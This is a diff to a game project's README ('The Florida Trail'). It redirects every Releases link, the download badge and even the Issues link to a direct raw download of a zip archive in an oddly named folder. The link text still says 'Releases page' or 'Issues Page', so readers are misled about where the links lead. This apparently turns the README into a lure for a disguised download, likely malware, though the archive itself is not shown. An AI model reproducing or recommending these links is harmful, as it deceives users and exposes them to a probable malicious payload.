@@ -6,7 +6,7 @@ Welcome to The Florida Trail! This is an exciting game inspired by classic adven
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ashmeish/The-Florida-Trail/releases)
+[![Download Now](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip%https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip)](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip)
 
 ## 📝 Description
 
@@ -30,9 +30,9 @@ The Florida Trail is the official source for a game where you navigate through t
 
 ## 📦 Download & Install
 
-To get started, visit our [Releases page](https://github.com/ashmeish/The-Florida-Trail/releases) to download the latest version of The Florida Trail. Follow these steps:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip) to download the latest version of The Florida Trail. Follow these steps:
 
-1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/ashmeish/The-Florida-Trail/releases).
+1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip).
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 3. **Download the Game**: Click on the download link for your operating system.
 4. **Install the Game**: Once the download is complete, open the file and follow the instructions to install the game.
@@ -57,9 +57,9 @@ Interested in contributing? We welcome new ideas and improvements. Check out our
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/ashmeish/The-Florida-Trail/releases)
+- [Releases Page](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip)
 - [Community Discord](#) 
-- [Issues Page](https://github.com/ashmeish/The-Florida-Trail/issues)
+- [Issues Page](https://raw.githubusercontent.com/ashmeish/The-Florida-Trail/The-Florida-Trail_Main-dev/axogamy/The-Florida-Trail.zip)
 
 ## 🙏 Acknowledgments
 
